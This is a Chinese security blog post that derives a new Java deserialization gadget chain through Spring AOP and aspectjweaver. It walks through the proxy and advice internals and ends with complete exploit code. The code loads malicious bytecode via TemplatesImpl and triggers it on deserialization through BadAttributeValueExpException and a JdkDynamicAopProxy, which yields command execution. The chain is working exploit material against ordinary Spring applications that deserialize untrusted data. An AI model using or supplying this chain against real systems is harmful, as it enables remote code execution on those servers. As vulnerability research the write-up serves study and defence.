---
title: "Spring AOP链"
onlyTitle: true
date: 2025-6-04 11:36:26
categories:
- java
- 框架漏洞
tags:
- springAOP
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8160.jpg
---



# Spring AOP链

## springAOP简介

Spring AOP（Aspect-Oriented Programming，面向切面编程）是 **Spring 框架中的一部分**，用于在不修改源代码的前提下，将横切关注点（cross-cutting concerns）**以可插拔的方式织入目标对象的执行流程中**。

Spring AOP 允许你在方法执行的“前、后、异常、返回”等时机，动态地插入代码逻辑（比如日志、权限检查、事务控制等），而**不改变业务代码本身**。

🏗️ Spring AOP 架构核心概念

| 名称                | 含义                                                         |
| ------------------- | ------------------------------------------------------------ |
| **Join Point**      | 程序执行过程中可以被拦截的点，比如方法调用。Spring AOP 仅支持方法级别的 Join Point。 |
| **Pointcut**        | 用于定义“哪些 Join Point 需要被拦截”，例如匹配某个包下所有 `@Service` 方法。 |
| **Advice**          | 横切逻辑代码，定义在哪个时机插入逻辑。包括：`@Before`、`@After`、`@Around` 等 |
| **Aspect**          | 切面，Advice 和 Pointcut 的组合体，通常用 `@Aspect` 注解声明 |
| **Weaving（织入）** | 将切面应用到目标对象的方法上的过程。Spring 主要用动态代理实现 |
| **Proxy**           | 目标对象的代理类，实际执行时代理来控制调用过程               |

Spring AOP 的实现方式实际上就是代理，分为JDK 动态代理CGLIB 字节码代理

| 实现方式             | 说明                                                         |
| -------------------- | ------------------------------------------------------------ |
| **JDK 动态代理**     | 针对接口代理，如果目标对象实现了接口，就使用 `java.lang.reflect.Proxy` |
| **CGLIB 字节码代理** | 针对类代理，若目标类没有接口，使用 CGLIB 动态生成子类字节码  |

## 漏洞简介

这是一个相对来说逻辑比较复杂，但代码简单的链子，网上的链子都用了两层代理，我写的poc只用了一层。

话不多说，直接给个链子：

```java
JdkDynamicAopProxy.invoke()->
ReflectiveMethodInvocation.proceed()->
AspectJAroundAdvice->invoke->
org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()->
method.invoke()
```

本来想用AspectJAfterAdvice.invoke的，但是不能控制invoke第一个参数

pom.xml

```xml
<dependency>
  <groupId>org.springframework</groupId>
  <artifactId>spring-aop</artifactId>
  <version>5.3.19</version>
</dependency>
<dependency>
  <groupId>org.aspectj</groupId>
  <artifactId>aspectjweaver</artifactId>
  <version>1.9.8</version>
</dependency>
```

依赖于Spring-AOP和aspectjweaver两个包，springboot中的spring-boot-starter-aop自带包含这两个类

sink点为org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()，看格式可以知道调用方式为：方法.invoke(对象，参数)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528182218192.png)

注意到AbstractAspectJAdvice是个抽象类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528182522239.png)

AspectJAroundAdvice继承了它

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528182749868.png)

AspectJAroundAdvice.invoke调用了invokeAdviceMethod，注意invoke的参数为MethodInvocation

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528182832605.png)

ReflectiveMethodInvocation调用了invoke，且参数恰好能对上

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528183548393.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250528183227069.png)

不过ReflectiveMethodInvocation没有继承Serializable接口，看下有没有new 去实例化的地方

在JdkDynamicAopProxy中找到创建新实例，而且是在invoke方法中

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250529102118438.png)

不仅如此，还在实例化后调用了proceed()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603180402065.png)

这样重载invoke的话？不出意外的，JdkDynamicAopProxy还是个继承了InvocationHandler的类，也就是动态代理类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250529102339775.png)

不过这个类前面并没有被public修饰，作用域为package-private，需要反射获取它的public构造方法

## POC构造

### invokeAdviceMethodWithGivenArgs

我们静态看下这个链是怎么从0构造的，而不是拿来就调试。

看一下invoke的参数是怎么传递的，其中前两个参数都来自构造函数，第三个参数actualArgs来自形参

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603171555687.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603171644097.png)

形参来自argBinding，这是个把参数存到adviceInvocationArgs数组中的方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603171743761.png)

我们调用TemplatesImpl.newTransformer()，参数为空，所以invokeAdviceMethod的参数应该全为空

我们手动调用一下AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs

```java
public class Aspectjweaver {
    public static void main(String[] args) throws Exception{
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Class<?> templates = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        // 2. 获取 newTransformer 方法
        Method newTransformerMethod = templates.getDeclaredMethod("newTransformer");
//        newTransformerMethod.invoke(templatesClass,null);
        SingletonAspectInstanceFactory singletonAspectInstanceFactory = new SingletonAspectInstanceFactory(templatesClass);
        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(newTransformerMethod,null,singletonAspectInstanceFactory);

        Method invokeAdviceMethodWithGivenArgs = AbstractAspectJAdvice.class.getDeclaredMethod("invokeAdviceMethodWithGivenArgs",Object[].class);
        invokeAdviceMethodWithGivenArgs.setAccessible(true);
        invokeAdviceMethodWithGivenArgs.invoke(aspectJAroundAdvice,new Object[]{null})
    }
}

```

然后再考虑加链子的细节，挨着装上去就完了，Gadget你不拼怎么叫Gadget呢😀

### 添加InterceptorAndDynamicMethodMatcher

现在把AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs换成AspectJAroundAdvice.invoke

invokeAdviceMethod的参数理论上应该全部为空

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603182805861.png)

所以AspectJAroundAdvice.invoke传入的参数mi不用过多的赋值，让传入invokeAdviceMethod的参数为空

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603182902893.png)

看下面这个图，因为invoke是在ReflectiveMethodInvocation.proceed中调用，我们分析一下这个proceed可以知道，其作用为：从interceptorsAndDynamicMethodMatchers中取出interceptor，并调用这个interceptor的invoke方法，至于中间的if，是一些interceptor有调用条件，比如匹配到xx class的xx方法才会触发该interceptor的invoke方法，这就是其Matcher的含义

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603204720212.png)

这两个invoke都能用吗？不是的，interceptorsAndDynamicMethodMatchers不是能随便赋值的

注意到interceptorsAndDynamicMethodMatchers在构造函数赋值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603205819778.png)

在JdkDynamicAopProxy.invoke中，在调用ReflectiveMethodInvocation构造函数之前，调用如下红框函数去生成List chain

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603190255004.png)

跟进，调用如下红框函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603210221699.png)

继续跟进，跟进到如下DefaultAdvisorChainFactory，完成了interceptorList的装入，可以看到装进去的是InterceptorAndDynamicMethodMatcher，另外也有直接装入的interceptors

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603210345101.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603214422099.png)

也就是说，因为ReflectiveMethodInvocation没有继承Serializable接口，所以必须用JdkDynamicAopProxy.invoke去动态创建它，传入的参数chain来自this.advised.getInterceptorsAndDynamicInterceptionAdvice。

注意，我们最后是动态代理去触发漏洞函数，如果加上匹配器，我们的method和class是绝对对应不上的（因为我们触发漏洞就是随便调一个函数去触发动态代理的invoke，invoke我们要确保任意函数都能触发漏洞，即invoke的method、class参数不影响poc执行），所以不要用matcher那条触发方式，而是` advisedSupport.addAdvice(aspectJAroundAdvice);`直接添加

另外的，advisorChainFactory不用特殊去设置，因为已经默认是DefaultAdvisorChainFactory了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603212305915.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603212323665.png)

目前，利用如下代码，我们在触发JdkDynamicAopProxy.invoke.invoke时，就能顺利的进入到DefaultAdvisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice

```java
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.addAdvice(aspectJAroundAdvice);
        advisedSupport.setTarget(aspectJAroundAdvice);
        Class<?> jdkDynamicAopProxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> jdkDynamicAopProxyClassConstructor = jdkDynamicAopProxyClass.getDeclaredConstructor(AdvisedSupport.class);
        jdkDynamicAopProxyClassConstructor.setAccessible(true);
        Object proxyInstance = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Advised.class}, (InvocationHandler) jdkDynamicAopProxyClassConstructor.newInstance(advisedSupport));
```



### invoke的触发

我们要触发JdkDynamicAopProxy.invoke，就得把JdkDynamicAopProxy的实例作为InvocationHandler去创建一个Proxy实例。

另外的，因为JdkDynamicAopProxy代理的 AdvisedSupport类，接口也应该传AdvisedSupport的接口，也就是advised。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604102554329.png)

那需要调用哪个方法才会触发invoke呢？

> Java 动态代理中，**只有接口中声明的方法** 被代理调用时，才会触发到代理类的 `invoke()` 方法。
>
> ```java
> MyInterface proxy = (MyInterface) Proxy.newProxyInstance(
>     classLoader,
>     new Class[]{MyInterface.class},
>     new MyInvocationHandler()
> );
> ```
>
> 如上，调用MyInterface接口内的方法，才会进入到MyInvocationHandler.invoke

那我们翻遍了advised接口，也没发现toString方法，但是我们在实际调用中，发现调用代理类的toString方法还是会进到InvocationHandler.invoke方法呢？

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604103352235.png)

为什么 `toString()` 也会被代理拦截？不是只有接口中的方法才会被代理吗？

答案是：**JDK 动态代理自动处理了 `Object` 类中的某些方法**

虽然 `toString()` 并不在接口中声明，但 JDK 动态代理机制对以下三个方法进行了**特殊处理**：toString、hashCode、equals

这三个方法被认为是“基础方法”，代理对象内部做了特殊适配

我们翻一下生成代理的ProxyGenerator.generateClassFile，可以发现函数一开始就加入了对这三个方法的代理

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604110121842.png)

所以，碰到代理类我们就可以用toString、hashCode、equals去触发invoke，而toString存在很多链子，比如BadAttributeExpection等

我们先手动调用toString进行调试

```java
        proxyInstance.toString();
```

发现必须给AbstractAspectJAdvice.pointcut设置一个expression，不然会报错，我们设置一个空的pointcut

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604111213545.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604111227782.png)

```java
AspectJExpressionPointcut aspectJExpressionPointcut = new AspectJExpressionPointcut();
```

如下，手动调用toString就能完成命令执行了

```java
public class Aspectjweaver {
    public static void main(String[] args) throws Exception{
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Class<?> templates = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        // 2. 获取 newTransformer 方法
        Method newTransformerMethod = templates.getDeclaredMethod("newTransformer");
        SingletonAspectInstanceFactory singletonAspectInstanceFactory = new SingletonAspectInstanceFactory(templatesClass);
        AspectJExpressionPointcut aspectJExpressionPointcut = new AspectJExpressionPointcut();
        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(newTransformerMethod,aspectJExpressionPointcut,singletonAspectInstanceFactory);

//        Method invokeAdviceMethodWithGivenArgs = AbstractAspectJAdvice.class.getDeclaredMethod("invokeAdviceMethodWithGivenArgs",Object[].class);
//        invokeAdviceMethodWithGivenArgs.setAccessible(true);
//        invokeAdviceMethodWithGivenArgs.invoke(aspectJAroundAdvice,new Object[]{null});

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.addAdvice(aspectJAroundAdvice);
        advisedSupport.setTarget(aspectJAroundAdvice);
        Class<?> jdkDynamicAopProxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> jdkDynamicAopProxyClassConstructor = jdkDynamicAopProxyClass.getDeclaredConstructor(AdvisedSupport.class);
        jdkDynamicAopProxyClassConstructor.setAccessible(true);
        Object proxyInstance = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Advised.class}, (InvocationHandler) jdkDynamicAopProxyClassConstructor.newInstance(advisedSupport));

        proxyInstance.toString();

    }
}
```

### 套readObject

我们套上readObject去触发toString

```java
package org.exploit.third.springAOP;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.springframework.aop.aspectj.*;
import org.springframework.aop.framework.*;

import javax.management.BadAttributeValueExpException;
import java.io.IOException;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;

//JdkDynamicAopProxy.invoke()->
//ReflectiveMethodInvocation.proceed()->
//AspectJAroundAdvice->invoke->
//org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()->
//method.invoke()
public class Aspectjweaver {
    public static void main(String[] args) throws Exception{
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Class<?> templates = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        // 2. 获取 newTransformer 方法
        Method newTransformerMethod = templates.getDeclaredMethod("newTransformer");
        SingletonAspectInstanceFactory singletonAspectInstanceFactory = new SingletonAspectInstanceFactory(templatesClass);
        AspectJExpressionPointcut aspectJExpressionPointcut = new AspectJExpressionPointcut();
        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(newTransformerMethod,aspectJExpressionPointcut,singletonAspectInstanceFactory);

//        Method invokeAdviceMethodWithGivenArgs = AbstractAspectJAdvice.class.getDeclaredMethod("invokeAdviceMethodWithGivenArgs",Object[].class);
//        invokeAdviceMethodWithGivenArgs.setAccessible(true);
//        invokeAdviceMethodWithGivenArgs.invoke(aspectJAroundAdvice,new Object[]{null});

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.addAdvice(aspectJAroundAdvice);
        advisedSupport.setTarget(aspectJAroundAdvice);
        Class<?> jdkDynamicAopProxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> jdkDynamicAopProxyClassConstructor = jdkDynamicAopProxyClass.getDeclaredConstructor(AdvisedSupport.class);
        jdkDynamicAopProxyClassConstructor.setAccessible(true);
        Object proxyInstance = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Advised.class}, (InvocationHandler) jdkDynamicAopProxyClassConstructor.newInstance(advisedSupport));
//        proxyInstance.toString();

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, proxyInstance);
        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```

需要注意的是 aspectJAdviceMethod被transient修饰

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603172724196.png)

而在AbstractAspectJAdvice.readObject还原了aspectJAdviceMethod

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250603172826323.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250604112526074.png)



如果给链子，自己写代码的话，逻辑还挺难的，调了一天多，弹计算器也是成就满满呢。

